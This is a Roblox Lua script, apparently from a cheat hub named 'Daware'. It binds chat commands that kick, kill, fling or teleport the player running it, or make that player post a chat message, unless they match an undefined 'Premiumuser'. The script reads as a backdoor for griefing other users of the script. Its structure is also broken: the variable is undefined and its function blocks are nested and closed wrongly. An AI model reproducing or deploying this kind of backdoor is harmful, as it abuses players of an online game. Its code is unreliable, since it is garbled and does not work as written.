game.Players.LocalPlayer.Chatted:connect(function(cht)
    if cht:match("!kick") then
            if game.Players.LocalPlayer ~= Premiumuser then
                game.Players.LocalPlayer:Kick("Kicked by Premium user")

            end
    end
    end)
    game.Players.LocalPlayer.Chatted:connect(function(cht)
    if cht:match("!users") then
            if game.Players.LocalPlayer ~= Premiumuser then
            wait(0) local A_1 = "Im a Daware user Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
            end 
        end

    end)

    game.Players.LocalPlayer.Chatted:connect(function(cht)
        if cht:match("!kill") then
            if game.Players.LocalPlayer ~= Premiumuser then
            local plr = game.Players.LocalPlayer
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
        end

    end)


    game.Players.LocalPlayer.Chatted:connect(function(cht)
        if cht:match("!fling") then
            if game.Players.LocalPlayer ~= Premiumuser then
            local plr = game.Players.LocalPlayer
                    plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end
        end






        game.Players.LocalPlayer.Chatted:connect(function(cht)
        if cht:match("!rejoin") then
            if game.Players.LocalPlayer ~= Premiumuser then
                local TeleportService = game:GetService("TeleportService")
                TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
            end
        end


        game.Players.LocalPlayer.Chatted:connect(function(cht)
        if cht:match("!star") then
            if game.Players.LocalPlayer ~= Premiumuser then

        end
    end
    end)
    end)
    end)
